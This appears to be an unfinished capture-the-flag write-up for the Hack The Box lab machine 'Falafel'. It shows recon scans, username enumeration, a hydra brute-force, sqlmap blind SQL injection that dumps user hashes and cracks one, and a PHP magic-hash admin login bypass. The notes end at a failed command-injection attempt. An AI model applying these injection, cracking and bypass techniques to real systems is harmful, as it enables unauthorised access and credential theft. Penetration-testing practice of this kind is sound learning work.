# Falafel (In progress)
- Target IP: 10.129.229.139

# Recon
```bash
nmap -iL scope.txt -p- -oA Nmap/All --open -Pn

# 22,80
```

```bash
nmap -iL scope.txt -p22 -sCV -oA Nmap/sCV-22 --open -Pn

# Output
# OpenSSH 7.2p2 Ubuntu 4ubuntu2.4
```

```bash
nmap -iL scope.txt -p80 -sCV -oA Nmap/sCV-80 --open -Pn

# Output
# Apache httpd 2.4.18 
# Falafel Lovers
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 20 --url http://10.129.229.139/

# Output
# /css                  (Status: 301) [Size: 314] [--> http://10.129.229.139/css/]
# /images               (Status: 301) [Size: 317] [--> http://10.129.229.139/images/]
# /uploads              (Status: 301) [Size: 318] [--> http://10.129.229.139/uploads/]
# /assets               (Status: 301) [Size: 317] [--> http://10.129.229.139/assets/]
# /js                   (Status: 301) [Size: 313] [--> http://10.129.229.139/js/]
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t 20 --url http://10.129.229.139/

# Output
# /assets               (Status: 301) [Size: 317] [--> http://10.129.229.139/assets/]                                                                                                           
# /css                  (Status: 301) [Size: 314] [--> http://10.129.229.139/css/]                                                                                                              
# /images               (Status: 301) [Size: 317] [--> http://10.129.229.139/images/]                                                                                                           
# /index.php            (Status: 200) [Size: 7203]                                                                                                                                              
# /js                   (Status: 301) [Size: 313] [--> http://10.129.229.139/js/]                                                                                                               
# /robots.txt           (Status: 200) [Size: 30]                                                                                                                                                
# /uploads              (Status: 301) [Size: 318] [--> http://10.129.229.139/uploads/]
```

- Page data
```
Welcome To FalafeLovers

The social network for people who just LOVE falafel.
This is a beta version of the site.
Please send any bug reports to the IT staff at IT@falafel.htb
```
- Added falafel.htb to `/etc/hosts`

- robots.txt
```
User-agent: *
Disallow: /*.txt
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_words.txt -t 20 -x txt --url http://falafel.htb/

# Output
# /assets               (Status: 301) [Size: 311] [--> http://falafel.htb/assets/]
# /css                  (Status: 301) [Size: 308] [--> http://falafel.htb/css/]
# /footer.php           (Status: 200) [Size: 0]
# /header.php           (Status: 200) [Size: 288]
# /images               (Status: 301) [Size: 311] [--> http://falafel.htb/images/]
# /index.php            (Status: 200) [Size: 7203]
# /js                   (Status: 301) [Size: 307] [--> http://falafel.htb/js/]
# /login.php            (Status: 200) [Size: 7063]
# /logout.php           (Status: 302) [Size: 0] [--> login.php]
# /profile.php          (Status: 302) [Size: 9787] [--> login.php]
# /robots.txt           (Status: 200) [Size: 30]
# /style.php            (Status: 200) [Size: 6174]
# /upload.php           (Status: 302) [Size: 0] [--> profile.php]
# /uploads              (Status: 301) [Size: 312] [--> http://falafel.htb/uploads/]
# /connection.php       (Status: 200) [Size: 0]
# /authorized.php       (Status: 302) [Size: 0] [--> login.php]
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 50 -x txt,php -b 404,403 --url http://falafel.htb/

# Output
# /logout.php           (Status: 302) [Size: 0] [--> login.php]
# /login.php            (Status: 200) [Size: 7063]
# /uploads              (Status: 301) [Size: 312] [--> http://falafel.htb/uploads/]
# /assets               (Status: 301) [Size: 311] [--> http://falafel.htb/assets/]
# /upload.php           (Status: 302) [Size: 0] [--> profile.php]
# /style.php            (Status: 200) [Size: 6174]
# /profile.php          (Status: 302) [Size: 9787] [--> login.php]
# /index.php            (Status: 200) [Size: 7203]
# /js                   (Status: 301) [Size: 307] [--> http://falafel.htb/js/]
# /css                  (Status: 301) [Size: 308] [--> http://falafel.htb/css/]
# /images               (Status: 301) [Size: 311] [--> http://falafel.htb/images/]
# /header.php           (Status: 200) [Size: 288]
# /footer.php           (Status: 200) [Size: 0]
# /robots.txt           (Status: 200) [Size: 30]
# /connection.php       (Status: 200) [Size: 0]
# /cyberlaw.txt         (Status: 200) [Size: 804]
```

- Cyberlaw.txt
```
From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!
Date: November 25, 2017 3:30:58 PM PDT
To: lawyers@falafel.htb, devs@falafel.htb
Delivery-Date: Tue, 25 Nov 2017 15:31:01 -0700
Mime-Version: 1.0
X-Spam-Status: score=3.7 tests=DNS_FROM_RFC_POST, HTML_00_10, HTML_MESSAGE, HTML_SHORT_LENGTH version=3.1.7
X-Spam-Level: ***

A user named "chris" has informed me that he could log into MY account without knowing the password,
then take FULL CONTROL of the website using the image upload feature.
We got a cyber protection on the login form, and a senior php developer worked on filtering the URL of the upload,
so I have no idea how he did it.

Dear lawyers, please handle him. I believe Cyberlaw is on our side.
Dear develpors, fix this broken site ASAP.

	~admin
```

# Username Enumeration
- Invalid
```
POST /login.php HTTP/1.1
Host: 10.129.229.139
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.229.139/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.129.229.139
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=nntim1jkcpq8a19ua1h3ouq0k4

username=roman&password=roman
--- Response

Try again..
```
- Valid
```
POST /login.php HTTP/1.1
Host: 10.129.229.139
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.129.229.139/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.129.229.139
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=nntim1jkcpq8a19ua1h3ouq0k4

username=admin&password=roman
--- Response

Wrong identification : admin
```

- Valid users
  - admin
  - chris
```bash
hydra -l chris -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt falafel.htb http-form-post "/login.php:username=^USER^&password=^PASS^:F=Wrong"

# Nada
```

- https://github.com/sqlmapproject/sqlmap/wiki/Usage
```
--string=STRING     String to match when query is evaluated to True
```

```bash
python3 sqlmap-dev/sqlmap.py -r login.req --string "Wrong"

[03:07:44] [INFO] POST parameter 'username' appears to be 'MySQL > 5.0.12 AND time-based blind (heavy query)' injectable 

```

```
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=chris' AND 4791=4791 AND 'mFHV'='mFHV&password=password
```

```
username=chris' or '1'='1' AND 'mFHV'='mFHV&password=password
```
- Despite the username being chris, the output reads:
```
Wrong identification : admin
```

```bash
python3 sqlmap-dev/sqlmap.py -r login.req --string "Wrong" --dbms=mysql --dbs --threads 10

[03:13:25] [INFO] retrieved: falafel           
```

```bash
python3 sqlmap-dev/sqlmap.py -r login.req --string "Wrong" --dbms=mysql -D falafel --tables

users
```

```
python3 sqlmap-dev/sqlmap.py -r login.req --string "Wrong" --dbms=mysql -D falafel -T users --columns

ID
username
password: varchar(32)
role
```

```
python3 sqlmap-dev/sqlmap.py -r login.req --string "Wrong" --dbms=mysql -D falafel -T users --dump

[03:15:56] [INFO] retrieved: admin                                                                                                                                                            
[03:16:00] [INFO] retrieved: 0e462096931906507119562988736854                                                                                                                                 
[03:16:24] [INFO] retrieved: admin                                                                                                                                                            
[03:16:27] [INFO] retrieved: 2                                                                                                                                                                
[03:16:28] [INFO] retrieved: normal                                                                                                                                                           
[03:16:32] [INFO] retrieved: d4ee02a22fc872e36d9e3751ba72ddc8                                                                                                                                 
[03:16:55] [INFO] retrieved: chris             
<...>
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[03:17:14] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/home/romanrii/10.129.229.139/SQLi/sqlmap-dev/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 
[03:17:20] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[03:17:24] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[03:17:24] [INFO] starting 4 processes 
[03:17:26] [INFO] cracked password 'juggling' for user 'chris'                                                                                                                               
Database: falafel                                                                                                                                                                            
Table: users
[2 entries]
+----+--------+---------------------------------------------+----------+
| ID | role   | password                                    | username |
+----+--------+---------------------------------------------+----------+
| 1  | admin  | 0e462096931906507119562988736854            | admin    |
| 2  | normal | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) | chris    |
+----+--------+---------------------------------------------+----------+                   
```

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -t 50 -x txt,php -b 404,403 -c 'PHPSESSID=nntim1jkcpq8a19ua1h3ouq0k4' --url http://falafel.
htb/

# Nothing new
```

- https://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo
```
md5('240610708') 's result is 0e462097431906509019562988736854.
md5('QNKCDZO') 's result is 0e830400451993494058024219903391.
```
- Both work as an admin password

- Upload functionality calls a remote http endpoint
- Allowed file types:
```
gif
jpg
png
```

- Tried command injection, endpoint filtering out characters needed to achieve
